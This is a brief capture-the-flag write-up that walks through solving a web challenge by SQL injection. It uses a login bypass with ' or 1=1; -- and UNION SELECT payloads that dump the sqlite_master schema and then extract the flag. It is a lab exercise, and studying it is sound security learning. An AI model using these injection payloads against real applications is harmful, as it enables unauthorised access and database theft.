  ![image](https://github.com/nhattanhh/CTF/assets/130430279/263162c9-f183-4469-a2a9-a2a029a4e952)

  -try 
  +username: user
  +password: user

  You will received this:
  ![image](https://github.com/nhattanhh/CTF/assets/130430279/a2908bbb-16e5-484f-82fb-a92a5990bb6b)

  -try SQLinjection with password because here we can see they receive password first.
  +username: 1
  +password: ' or 1=1; --

  ![image](https://github.com/nhattanhh/CTF/assets/130430279/2e6a269a-5576-4f43-88e1-284b80b0984e)

  I think that this search box can execute sqli.
  try:  Algiers' union select sql,1,1 from sqlite_master;--

  ![image](https://github.com/nhattanhh/CTF/assets/130430279/3217e94e-907e-402e-8296-fc9f2cfb12ad)

  And:  Angiers' union select flag,1,1 from more_table;--

  ![image](https://github.com/nhattanhh/CTF/assets/130430279/fbf6bb2c-af9e-4ced-b497-27f037a565d0)

  *BOOM*


